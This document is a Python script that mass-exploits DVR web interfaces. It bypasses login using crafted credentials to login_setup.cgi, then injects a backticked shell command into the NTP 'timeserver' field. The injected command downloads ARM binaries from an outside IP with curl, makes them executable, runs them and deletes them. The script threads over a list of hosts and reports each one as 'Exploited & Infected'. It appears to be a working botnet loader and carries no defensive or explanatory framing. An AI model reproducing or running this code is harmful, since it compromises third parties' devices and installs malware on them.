import threading
import httpx

class Main:
    def __init__(self, ip):
        self.ip = ip # "http://" + ip + ":60000"
        self.client = httpx.Client(timeout=120, verify=False)

    def login(self):
        try:
            req = self.client.post(f"{self.ip}/cgi-bin/login_setup.cgi",
                                   data={
                                       "enc": "11",
                                       "ip": self.ip,
                                       "username": "n5mRkpQAAAAAAAAAAAAAAA%3D%3D",
                                       "password": "n5mRkpQAAAAAAAAA",
                                   })
            if "PT_The_password_does_not_match_" not in req.text and req.status_code == 200:
                with open('success.txt', 'a+') as f:
                    f.write(f"{self.ip}\n")
                req = self.client.post(f"{self.ip}/cgi-bin/cgi_login.cgi",
                                       data={
                                           "lang": "ja",
                                           "id": "",
                                           "pwd": ""
                                       })

                if req.status_code == 200:
                    req = self.client.post(f"{self.ip}/cgi-bin/system_ntp.cgi",
                                           data={
                                               "lang": "ja",
                                               "useNTPServer": "1",
                                               "synccheck": "1",
                                               "public": "0",
                                               "timeserver": "",
                                               "interval": "60",
                                               "enableNTPServer": "1"
                                           })

                if req.status_code == 200:
                    req = self.client.post(f"{self.ip}/cgi-bin/system_ntp.cgi",
                                           data={
                                               "lang": "ja",
                                               "useNTPServer": "1",
                                               "synccheck": "1",
                                               "public": "0",
                                               "timeserver": "`rm -rf arm7; curl -O http://144.172.73.12/arm7; chmod 777 arm7; ./arm7 korea.dvr; rm -rf arm7; rm -rf arm5; curl -O http://144.172.73.12/arm5; chmod 777 arm5; ./arm5 korea.dvr; rm -rf arm5; `",
                                               "interval": "60",
                                               "enableNTPServer": "1"
                                           })

                    if req.status_code == 200:
                        print(f"[+] Exploited & Infected DVR -> {self.ip}")
        except Exception as e:
            print(f"An error occurred for {self.ip}: {str(e)}")

if __name__ == "__main__":
    for i in open('success.txt').read().splitlines():
        threading.Thread(target=Main(i).login).start()
